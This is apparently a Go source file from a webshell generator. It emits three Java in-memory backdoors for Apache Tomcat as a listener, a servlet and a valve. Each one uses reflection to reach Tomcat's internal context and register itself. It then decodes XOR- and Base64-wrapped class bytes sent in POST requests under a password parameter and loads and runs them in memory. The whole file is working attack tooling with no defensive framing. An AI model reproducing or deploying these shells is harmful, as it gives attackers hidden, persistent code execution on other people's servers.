package Betomcat

import "webshell/common"

func TomXorbL() {
	common.Filename = "TomcatListener.java"
	common.Webshells = `import java.lang.reflect.*;
import java.util.*;

public class TomcatListener implements InvocationHandler {
    private static String password = "` + common.Password + `";

    private static Object lock = new Object();

    private Field getField(Object obj, String fieldName) {
        Class clazz;
        Field field = null;
        if (obj == null) {
            return null;
        }
        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field != null) {
            try {
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                field.setAccessible(true);
            } catch (Exception e) {}
        }
        return field;
    }

    private Object getFieldValue(Object obj, String fieldName) {
        Field field;
        if (obj instanceof Field) {
            field = (Field) obj;
        } else {
            field = getField(obj, fieldName);
        }
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            return null;
        }
    }

    private Method getMethodX(Class clazz, String methodName, int num) {
        Method[] methods = clazz.getDeclaredMethods();
        for (Method method : methods) {
            if (method.getName().equals(methodName)) {
                if (method.getParameterTypes().length == num) {
                    return method;
                }
            }
        }
        return null;
    }

    private Method getMethod(Class clazz, String methodName, Class... args) {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, args);
                clazz = null;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    private Object invokeMethod(
        Object obj, String methodName, Object... args
    ) {
        ArrayList clazzs = new ArrayList();
        if (args != null) {
            for (int i=0; i<args.length; i++) {
                Object arg = args[i];
                if (arg != null) {
                    clazzs.add(arg.getClass());
                } else {
                    clazzs.add(null);
                }
            }
        }
        Method method = getMethod(
            obj.getClass(), methodName,
            (Class[]) clazzs.toArray(new Class[]{})
        );
        try {
            method.setAccessible(true);
            return method.invoke(obj, args);
        } catch (Exception e) {
            return null;
        }
    }

    private ClassLoader getLoader() {
        return Thread.currentThread().getContextClassLoader();
    }

    private byte[] b64decode(String payload) {
        Class base64;
        byte[] bytes = null;
        try {
            base64 = Class.forName("java.util.Base64");
            bytes = (byte[]) invokeMethod(
                getMethod(base64, "getDecoder").invoke(base64),
                "decode", payload
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                bytes = (byte[]) invokeMethod(
                    base64.newInstance(), "decodeBuffer", payload
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return bytes;
    }


    private Object getStandardContext() throws Exception {
        Object standardContext = invokeMethod(
                getFieldValue(getLoader(), "resources"),
                "getContext"
        );

        if (standardContext != null) {
            return standardContext;
        }

        Class registry = Class.forName(
            "org.apache.tomcat.util.modeler.Registry"
        );
        Object mbeanServer = invokeMethod(
            getMethodX(registry, "getRegistry", 2)
                .invoke(registry, null, null),
            "getMBeanServer"
        );
        Object mbsInterceptor = getFieldValue(mbeanServer, "mbsInterceptor");
        Object repository = getFieldValue(mbsInterceptor, "repository");
        HashMap domainTb = (HashMap) getFieldValue(repository, "domainTb");
        HashMap catalina = (HashMap) domainTb.get("Catalina");
        Object nonLoginAuthenticator = null;
        Iterator<String> keySet = catalina.keySet().iterator();
        while(keySet.hasNext()) {
            String key = keySet.next();
            if (key.contains("NonLoginAuthenticator")) {
                nonLoginAuthenticator = catalina.get(key);
                break;
            }
        }
        Object object = getFieldValue(nonLoginAuthenticator, "object");
        Object resource = getFieldValue(object, "resource");
        return getFieldValue(resource, "context");
    }


    private byte[] cipher(
        byte[] payload, String alg, byte[] key, boolean isEnc
    ) {
        try {
            byte[] result = new byte[payload.length];
            for (int i = 0; i < result.length; i++) {
                result[i] = (byte) (payload[i] ^ key[i + 1 & 15]);
            }
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    private String hasher(String str, String alg) {
        try {
            java.security.MessageDigest h =
                java.security.MessageDigest.getInstance(alg);
            h.update(str.getBytes(), 0, str.length());
            return new java.math.BigInteger(1, h.digest()).toString(16);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] decoder(String payload) {
        return cipher(
            b64decode(payload), "XOR",
            hasher(password, "MD5").substring(0, 16).getBytes(), false
        );
    }


    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (invokeMethod(request, "getMethod").equals("POST")) {
            payload = (String) invokeMethod(
                    invokeMethod(request, "getReader"),"readLine"
            );
            java.util.HashMap pageContext = new java.util.HashMap();
            Object session = invokeMethod(request, "getSession");
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            invokeMethod(session, "putValue",
                'u', hasher(password, "MD5").substring(0, 16));
            byte[] b = decoder(payload);
            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            ((Class) defineMethod.invoke(classloader, b, 0, b.length))
                .newInstance().equals(pageContext);
        }
        return null;
    }

    private void hook(Object servletRequestEvent) throws Exception {
        Object servletRequest = invokeMethod(
            servletRequestEvent, "getServletRequest"
        );
        Object request = getFieldValue(servletRequest, "request");
        Object response = invokeMethod(request, "getResponse");
        String payload = (String) invokeMethod(
            servletRequest, "getParameter", password
        );
        stub(payload, request, response);
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {
        if (method.getName().equals("requestInitialized")) {
            Object servletRequestEvent = args[0];
            hook(servletRequestEvent);
        }
        return null;
    }

    private void addListener(Object proxyObject) throws Exception {
        Object context = getStandardContext();
        for (Object listener :
            (Object[]) invokeMethod(context, "getApplicationEventListeners")
        ) {
            if (listener instanceof Proxy) {
                return;
            }
        }
        getMethodX(context.getClass(), "addApplicationEventListener", 1)
            .invoke(context, proxyObject);
    }

    public TomcatListener() {
        synchronized(lock) {
            Class servletRequestListener = null;
            try {
                servletRequestListener = Class.forName(
                    "javax.servlet.ServletRequestListener"
                );
            } catch (ClassNotFoundException e) {
                try {
                    servletRequestListener = Class.forName(
                        "jakarta.servlet.ServletRequestListener"
                    );
                } catch (ClassNotFoundException ex) {}
            }

            if (servletRequestListener != null) {
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(), new Class[]{servletRequestListener}, this
                );
                try {
                    addListener(proxyObject);
                } catch (Exception e) {}
            }
        }
    }

    static {
        new TomcatListener();
    }
}
`
}

func TomcatXorSebe() {
	common.Filename = "TomcatServlet.java"
	common.Webshells = `import java.lang.reflect.*;
import java.util.*;

public class TomcatServlet implements InvocationHandler {
    private static String pattern = "*.xml";
    private static String password = "` + common.Password + `";

    private static Object lock = new Object();

    private Field getField(Object obj, String fieldName) {
        Class clazz;
        Field field = null;
        if (obj == null) {
            return null;
        }
        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field != null) {
            try {
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                field.setAccessible(true);
            } catch (Exception e) {}
        }
        return field;
    }

    private Object getFieldValue(Object obj, String fieldName) {
        Field field;
        if (obj instanceof Field) {
            field = (Field) obj;
        } else {
            field = getField(obj, fieldName);
        }
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            return null;
        }
    }

    private Method getMethodX(Class clazz, String methodName, int num) {
        Method[] methods = clazz.getDeclaredMethods();
        for (Method method : methods) {
            if (method.getName().equals(methodName)) {
                if (method.getParameterTypes().length == num) {
                    return method;
                }
            }
        }
        return null;
    }

    private Method getMethod(Class clazz, String methodName, Class... args) {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, args);
                clazz = null;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    private Object invokeMethod(
        Object obj, String methodName, Object... args
    ) {
        ArrayList clazzs = new ArrayList();
        if (args != null) {
            for (int i=0; i<args.length; i++) {
                Object arg = args[i];
                if (arg != null) {
                    clazzs.add(arg.getClass());
                } else {
                    clazzs.add(null);
                }
            }
        }
        Method method = getMethod(
            obj.getClass(), methodName,
            (Class[]) clazzs.toArray(new Class[]{})
        );
        try {
            method.setAccessible(true);
            return method.invoke(obj, args);
        } catch (Exception e) {
            return null;
        }
    }

    private ClassLoader getLoader() {
        return Thread.currentThread().getContextClassLoader();
    }

    private byte[] b64decode(String payload) {
        Class base64;
        byte[] bytes = null;
        try {
            base64 = Class.forName("java.util.Base64");
            bytes = (byte[]) invokeMethod(
                getMethod(base64, "getDecoder").invoke(base64),
                "decode", payload
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                bytes = (byte[]) invokeMethod(
                    base64.newInstance(), "decodeBuffer", payload
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return bytes;
    }


    private Object getStandardContext() throws Exception {
        Object standardContext = invokeMethod(
                getFieldValue(getLoader(), "resources"),
                "getContext"
        );

        if (standardContext != null) {
            return standardContext;
        }

        Class registry = Class.forName(
            "org.apache.tomcat.util.modeler.Registry"
        );
        Object mbeanServer = invokeMethod(
            getMethodX(registry, "getRegistry", 2)
                .invoke(registry, null, null),
            "getMBeanServer"
        );
        Object mbsInterceptor = getFieldValue(mbeanServer, "mbsInterceptor");
        Object repository = getFieldValue(mbsInterceptor, "repository");
        HashMap domainTb = (HashMap) getFieldValue(repository, "domainTb");
        HashMap catalina = (HashMap) domainTb.get("Catalina");
        Object nonLoginAuthenticator = null;
        Iterator<String> keySet = catalina.keySet().iterator();
        while(keySet.hasNext()) {
            String key = keySet.next();
            if (key.contains("NonLoginAuthenticator")) {
                nonLoginAuthenticator = catalina.get(key);
                break;
            }
        }
        Object object = getFieldValue(nonLoginAuthenticator, "object");
        Object resource = getFieldValue(object, "resource");
        return getFieldValue(resource, "context");
    }


    private byte[] cipher(
        byte[] payload, String alg, byte[] key, boolean isEnc
    ) {
        try {
            byte[] result = new byte[payload.length];
            for (int i = 0; i < result.length; i++) {
                result[i] = (byte) (payload[i] ^ key[i + 1 & 15]);
            }
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    private String hasher(String str, String alg) {
        try {
            java.security.MessageDigest h =
                java.security.MessageDigest.getInstance(alg);
            h.update(str.getBytes(), 0, str.length());
            return new java.math.BigInteger(1, h.digest()).toString(16);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] decoder(String payload) {
        return cipher(
            b64decode(payload), "XOR",
            hasher(password, "MD5").substring(0, 16).getBytes(), false
        );
    }


    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (invokeMethod(request, "getMethod").equals("POST")) {
            payload = (String) invokeMethod(
                    invokeMethod(request, "getReader"),"readLine"
            );
            java.util.HashMap pageContext = new java.util.HashMap();
            Object session = invokeMethod(request, "getSession");
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            invokeMethod(session, "putValue",
                'u', hasher(password, "MD5").substring(0, 16));
            byte[] b = decoder(payload);
            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            ((Class) defineMethod.invoke(classloader, b, 0, b.length))
                .newInstance().equals(pageContext);
        }
        return null;
    }

    private void hook(Object servletRequest, Object servletResponse)
            throws Exception {
        String payload = (String) invokeMethod(
            servletRequest, "getParameter", password
        );
        stub(payload, servletRequest, servletResponse);
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {
        if (method.getName().equals("service")) {
            Object servletRequest = args[0];
            Object servletResponse = args[1];
            hook(servletRequest, servletResponse);
        }
        return null;
    }

    private void addSevlet(Object proxyObject) throws Exception {
        Object context = getStandardContext();
        Object wrapper = invokeMethod(context, "createWrapper");
        String name = this.getClass().getName();
        invokeMethod(wrapper, "setServletName", name);
        invokeMethod(wrapper, "setLoadOnStartupString", "1");
        getField(wrapper, "instance").set(wrapper, proxyObject);
        invokeMethod(
            wrapper, "setServletClass", proxyObject.getClass().getName()
        );
        getMethodX(context.getClass(), "addChild", 1).invoke(context, wrapper);
        getMethodX(context.getClass(), "addServletMappingDecoded", 3)
            .invoke(context, pattern, name, false);
    }

    public TomcatServlet() {
        synchronized(lock) {
            Class servletClass = null;
            try {
                servletClass = Class.forName(
                    "javax.servlet.Servlet"
                );
            } catch (ClassNotFoundException e) {
                try {
                    servletClass = Class.forName(
                        "jakarta.servlet.Servlet"
                    );
                } catch (ClassNotFoundException ex) {}
            }

            if (servletClass != null) {
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(), new Class[]{servletClass}, this
                );
                try {
                    addSevlet(proxyObject);
                } catch (Exception e) {}
            }
        }
    }

    static {
        new TomcatServlet();
    }
}
`
}

func TomcatXorVabe() {
	common.Filename = "TomcatValve.java"
	common.Webshells = `
import java.lang.reflect.*;
import java.util.*;

public class TomcatValve implements InvocationHandler {
    private static String password = "` + common.Password + `";
    private static Object nextvalve = null;

    private static Object lock = new Object();

    private Field getField(Object obj, String fieldName) {
        Class clazz;
        Field field = null;
        if (obj == null) {
            return null;
        }
        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field != null) {
            try {
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                field.setAccessible(true);
            } catch (Exception e) {}
        }
        return field;
    }

    private Object getFieldValue(Object obj, String fieldName) {
        Field field;
        if (obj instanceof Field) {
            field = (Field) obj;
        } else {
            field = getField(obj, fieldName);
        }
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            return null;
        }
    }

    private Method getMethodX(Class clazz, String methodName, int num) {
        Method[] methods = clazz.getDeclaredMethods();
        for (Method method : methods) {
            if (method.getName().equals(methodName)) {
                if (method.getParameterTypes().length == num) {
                    return method;
                }
            }
        }
        return null;
    }

    private Method getMethod(Class clazz, String methodName, Class... args) {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, args);
                clazz = null;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    private Object invokeMethod(
        Object obj, String methodName, Object... args
    ) {
        ArrayList clazzs = new ArrayList();
        if (args != null) {
            for (int i=0; i<args.length; i++) {
                Object arg = args[i];
                if (arg != null) {
                    clazzs.add(arg.getClass());
                } else {
                    clazzs.add(null);
                }
            }
        }
        Method method = getMethod(
            obj.getClass(), methodName,
            (Class[]) clazzs.toArray(new Class[]{})
        );
        try {
            method.setAccessible(true);
            return method.invoke(obj, args);
        } catch (Exception e) {
            return null;
        }
    }

    private ClassLoader getLoader() {
        return Thread.currentThread().getContextClassLoader();
    }

    private byte[] b64decode(String payload) {
        Class base64;
        byte[] bytes = null;
        try {
            base64 = Class.forName("java.util.Base64");
            bytes = (byte[]) invokeMethod(
                getMethod(base64, "getDecoder").invoke(base64),
                "decode", payload
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                bytes = (byte[]) invokeMethod(
                    base64.newInstance(), "decodeBuffer", payload
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return bytes;
    }


    private Object getStandardContext() throws Exception {
        Object standardContext = invokeMethod(
                getFieldValue(getLoader(), "resources"),
                "getContext"
        );

        if (standardContext != null) {
            return standardContext;
        }

        Class registry = Class.forName(
            "org.apache.tomcat.util.modeler.Registry"
        );
        Object mbeanServer = invokeMethod(
            getMethodX(registry, "getRegistry", 2)
                .invoke(registry, null, null),
            "getMBeanServer"
        );
        Object mbsInterceptor = getFieldValue(mbeanServer, "mbsInterceptor");
        Object repository = getFieldValue(mbsInterceptor, "repository");
        HashMap domainTb = (HashMap) getFieldValue(repository, "domainTb");
        HashMap catalina = (HashMap) domainTb.get("Catalina");
        Object nonLoginAuthenticator = null;
        Iterator<String> keySet = catalina.keySet().iterator();
        while(keySet.hasNext()) {
            String key = keySet.next();
            if (key.contains("NonLoginAuthenticator")) {
                nonLoginAuthenticator = catalina.get(key);
                break;
            }
        }
        Object object = getFieldValue(nonLoginAuthenticator, "object");
        Object resource = getFieldValue(object, "resource");
        return getFieldValue(resource, "context");
    }


    private byte[] cipher(
        byte[] payload, String alg, byte[] key, boolean isEnc
    ) {
        try {
            byte[] result = new byte[payload.length];
            for (int i = 0; i < result.length; i++) {
                result[i] = (byte) (payload[i] ^ key[i + 1 & 15]);
            }
            return result;
        } catch (Exception e) {
            return null;
        }
    }

    private String hasher(String str, String alg) {
        try {
            java.security.MessageDigest h =
                java.security.MessageDigest.getInstance(alg);
            h.update(str.getBytes(), 0, str.length());
            return new java.math.BigInteger(1, h.digest()).toString(16);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] decoder(String payload) {
        return cipher(
            b64decode(payload), "XOR",
            hasher(password, "MD5").substring(0, 16).getBytes(), false
        );
    }


    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (invokeMethod(request, "getMethod").equals("POST")) {
            payload = (String) invokeMethod(
                    invokeMethod(request, "getReader"),"readLine"
            );
            java.util.HashMap pageContext = new java.util.HashMap();
            Object session = invokeMethod(request, "getSession");
            pageContext.put("request", request);
            pageContext.put("response", response);
            pageContext.put("session", session);
            invokeMethod(session, "putValue",
                'u', hasher(password, "MD5").substring(0, 16));
            byte[] b = decoder(payload);
            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            ((Class) defineMethod.invoke(classloader, b, 0, b.length))
                .newInstance().equals(pageContext);
        }
        return null;
    }

    private void hook(Object request, Object response) throws Exception {
        String payload = (String) invokeMethod(
            request, "getParameter", password
        );
        stub(payload, request, response);
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {
        String methodName = method.getName();
        if (methodName.equals("invoke")) {
            Object request = args[0];
            Object response = args[1];
            hook(request, response);
            Method invoke = getMethodX(nextvalve.getClass(), "invoke", 2);
            invoke.setAccessible(true);
            invoke.invoke(nextvalve, request, response);
        } else if (methodName.equals("setNext")) {
            nextvalve = args[0];
        } else if (methodName.equals("getNext")) {
            return nextvalve;
        } else if (methodName.equals("toString")) {
            return this.getClass().getName();
        } else if (methodName.equals("isAsyncSupported")) {
            return false;
        }
        return null;
    }

    private void addValve(Object proxyObject) throws Exception {
        Object context = getStandardContext();
        Object pipeline = invokeMethod(context, "getPipeline");
        getMethodX(pipeline.getClass(), "addValve", 1)
            .invoke(pipeline, proxyObject);
    }

    public TomcatValve() {
        synchronized(lock) {
            Class valveClass = null;
            try {
                valveClass = Class.forName(
                    "org.apache.catalina.Valve"
                );
            } catch (ClassNotFoundException e) {}

            if (valveClass != null) {
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(),
                    new Class[]{valveClass},
                    this
                );
                try {
                    addValve(proxyObject);
                } catch (Exception e) {}
            }
        }
    }

    static {
        new TomcatValve();
    }
}
`
}
